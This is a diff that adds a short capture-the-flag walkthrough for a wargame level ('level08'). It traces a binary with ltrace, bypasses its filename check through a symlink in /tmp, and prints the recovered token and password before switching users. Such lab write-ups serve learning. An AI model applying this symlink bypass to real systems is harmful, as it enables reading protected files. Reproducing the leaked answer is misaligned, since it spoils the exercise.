@@ -1,0 +1,12 @@
+> ls -al
+
+> ./level08 token
+> ltrace ./level08 token
+
+> ln -s ~/token /tmp/tooken
+> ./level08 /tmp/tooken
+
+quif5eloekouj29ke0vouxean
+
+> su flag08
+> su level08
